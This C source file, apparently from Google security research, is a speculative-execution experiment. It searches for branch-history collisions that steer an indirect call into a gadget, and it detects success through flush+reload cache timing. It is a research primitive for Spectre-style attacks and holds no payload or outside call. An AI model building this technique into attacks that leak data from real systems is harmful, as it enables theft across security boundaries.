/*
Copyright 2025 Google LLC

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    https://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <ctype.h>
#include <string.h>
#include <sys/mman.h>
#include <assert.h>
#include <time.h>
#include <errno.h>

#define MAX_HISTORY_SIZE 128

static inline __attribute__((always_inline)) void clflush(void* p) {
    asm volatile("clflush (%0)\n"::"r"(p));
}
static inline __attribute__((always_inline)) void fence(void) {
    asm volatile("mfence");
}
static inline __attribute__((always_inline)) void lfence(void) {
    asm volatile("lfence");
}
static inline __attribute__((always_inline)) uint64_t load_time(const void *addr) {
  uint64_t ret;
  asm volatile(
      "rdtscp\n"
      "mov %%eax, %%ebx\n"
      "mov %%edx, %%r8d\n"
      "lfence\n"
      "movb (%%rdi), %%cl\n"
      "rdtscp\n"
      "lfence\n"
      "shlq $32, %%r8\n"
      "orq %%r8, %%rbx\n"
      "shlq $32, %%rdx\n"
      "orq %%rdx, %%rax\n"
      "subq %%rbx, %%rax\n"
      : "=a"(ret)
      : "D"(addr)
      : "rbx", "rcx", "rdx", "r8", "memory");
  return ret;
}

extern void victim(uint8_t *history, void *target, uint8_t *arg);
extern void out_of_place_chain_collider(uint8_t *history, void *target, uint8_t *arg);
extern void out_of_place_for_if_collider(uint8_t *history, void *target, uint8_t *arg);
extern void out_of_place_quad_for_if_collider(uint8_t *history, void *target, uint8_t *arg);
extern void ret_gadget(void);
extern void hit_gadget(uint8_t *arg);

void c_out_of_place_for_if_collider(uint8_t *history, void *target, uint8_t *arg) {
  for (int i = 0; i < MAX_HISTORY_SIZE; i++) {
    if (history[i]) { asm volatile("nop"); }
  }
  void(* fptr)(uint8_t*) = target;
  clflush((void*)&fptr);
  fence();
  lfence();
  fptr(arg);
}

#define FIRST_FILL victim

// Choose one:
//#define SECOND_FILL victim
//#define SECOND_FILL out_of_place_chain_collider
//#define SECOND_FILL out_of_place_for_if_collider
#define SECOND_FILL out_of_place_quad_for_if_collider
//#define SECOND_FILL c_out_of_place_for_if_collider

uint8_t hit_history[MAX_HISTORY_SIZE];
uint8_t ret_history[MAX_HISTORY_SIZE];
uint8_t *fr_buf;
uint8_t *fake_fr_buf;
uint8_t ret_history_to_recheck[MAX_HISTORY_SIZE];

int doit() {
  //Flush
  clflush(fr_buf);
  fence();   //Ensure all memory operations are done

  //Train hit_history -> hit_gadget
  FIRST_FILL(hit_history, &hit_gadget, fake_fr_buf);

  //See if ret_history still collides
  SECOND_FILL(ret_history, &ret_gadget, fr_buf);

  //Reload
  return load_time(fr_buf) < 150;
}

#define CONTROL_FROM  0
#define CONTROL_TO    MAX_HISTORY_SIZE - 0

struct xorshift128_state {
    uint32_t x[4];
};
struct xorshift128_state state;
/* The state must be initialized to non-zero */
uint32_t xorshift128()
{
  /* Algorithm "xor128" from p. 5 of Marsaglia, "Xorshift RNGs" */
  uint32_t t  = state.x[3];
  uint32_t s  = state.x[0];  /* Perform a contrived 32-bit shift. */
  state.x[3] = state.x[2];
  state.x[2] = state.x[1];
  state.x[1] = s;
  t ^= t << 11;
  t ^= t >> 8;
  return state.x[0] = t ^ s ^ (s >> 19);
}

int main(int argc, char **argv)
{
  int hits = 0;

  state.x[0] = time(0);
  state.x[1] = time(0);
  state.x[2] = time(0);
  state.x[3] = time(0);
  for (int i = 0; i < 100; i++) xorshift128();

  fr_buf = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  memset(fr_buf, 0x41, 0x1000);
  fake_fr_buf = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
  memset(fake_fr_buf, 0x41, 0x1000);

  // Define once the target history
  for (int i = 0; i < MAX_HISTORY_SIZE; i++) {
    hit_history[i] = xorshift128() & 1;
  }
  // Randomize the whole history once
  for (int i = 0; i < MAX_HISTORY_SIZE; i++) {
    ret_history[i] = xorshift128() & 1;
  }

  long long maybes = 0;
  long long itnum = 0;
  int numcols = 0;
  int recheck_at = -1;
  int confirmed = 0;
  while (1) {
    itnum++;

    for (int i = CONTROL_FROM; i < CONTROL_TO; i++) {
      ret_history[i] = xorshift128() & 1;
    }

    hits = doit();
    if (hits > 0) {
      maybes++;
      //printf("hits: %d/%d\n", hits, ITERS);

#define CONFIRM 10000
      int sumhits = 0;
      for (int j = 0; j < CONFIRM; j++) {
        sumhits += doit();
      }
      if (sumhits > CONFIRM / 2) {
        numcols++;
        // Real deal!
        printf("got >half (%d) on avg; history was:\n", sumhits);
        printf("hit: ");
        for (int i = MAX_HISTORY_SIZE - 40; i < MAX_HISTORY_SIZE; i++) {
          printf("%d ", hit_history[i]);
        }
        printf("\nret: ");
        for (int i = MAX_HISTORY_SIZE - 40; i < MAX_HISTORY_SIZE; i++) {
          printf("%d ", ret_history[i]);
        }
        printf("\n");

        memcpy(ret_history_to_recheck, ret_history, MAX_HISTORY_SIZE);
        recheck_at = itnum + 1337;
      }
    }

    if (itnum % 100000 == 0) {
      int nc = confirmed;
      if (nc == 0) nc = 1;
      printf("%lld maybes; %d collisions (%d confirmed) @ %lld itnum (%lldk per)\n",
             maybes, numcols, confirmed, itnum, itnum/nc/1000);
    }
    hits = 0;

    if (itnum == recheck_at) {
      memcpy(ret_history, ret_history_to_recheck, MAX_HISTORY_SIZE);
      int sumhits = 0;
      for (int j = 0; j < CONFIRM; j++) {
        sumhits += doit();
      }
      printf("  Just rechecking after 1337 iterations... Got %d (%d%%)\n", sumhits, sumhits*100/CONFIRM);
      if (sumhits > CONFIRM / 10) { // relaxed to 10% for confirmation
        confirmed++;
      }
      continue;
    }

  }

  return 0;
}

